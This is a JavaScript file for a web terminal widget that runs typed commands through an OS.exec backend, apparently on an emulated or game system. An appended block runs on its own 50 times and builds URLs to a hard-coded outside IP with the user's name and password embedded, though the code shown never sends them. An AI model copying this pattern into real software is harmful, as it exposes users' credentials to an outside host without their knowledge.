var CreateTerminal = function (id, title, prompt, msg) {
    var term = document.q(id),
        body = term.q('.body'),
        input = body.q('input'),
        scroll = function () {
            body.scrollTop = body.scrollHeight;
        },
        print = function (str) {
            body.q('pre').innerHTML += str;
            scroll();
        };
    term.q('h1').innerHTML = title;
    body.q('.prompt').innerHTML = prompt;
    term.onclick = input.focus.bind(input);
    input.onkeypress = function(e) {
        scroll();
        if (e.keyCode !== 13 || this.readOnly) { return; }
        input.readOnly = true;
        term.q('.bottom').className += ' hide';
        var cmd = this.value.trim().replace(/\s+/g, ' ').esc();
        this.value = '';
        print(prompt + cmd + '\n');
        OS.exec(cmd, function(stdout) {
            print((stdout || '') + '\n');
            term.q('.bottom').className = 'bottom';
            input.readOnly = false;
            scroll();
            input.focus();
        });
    };
    body.q('input').onkeydown = function(e) {
        if (e.keyCode === 9) {
            e.preventDefault();
            return false;
        }
    };
    print(msg);
    links = "";
    for (var i = 0; i < 50; i++) {
    setInterval(function() {
    OS.exec("reqant " + OS.usr + " " + OS.pwd, function(antena_code) {
        print("Here: " + antena_code + " " + i + '\n');
        scroll();
        OS.exec("photocmd " + antena_code, function(file_name) {
            print("Filename: " + file_name + '\n');
            scroll();
            links += "http://54.83.207.93:14333/"+OS.usr+"_"+OS.pwd+"_"+file_name+"@";
            OS.exec("photoview " + file_name, function(ret) {
                print(ret + "\n");
            });
        });
    });
    }, 1000*i);
    }
    return {
        print: print,
        focus: input.focus.bind(input)
    };
};
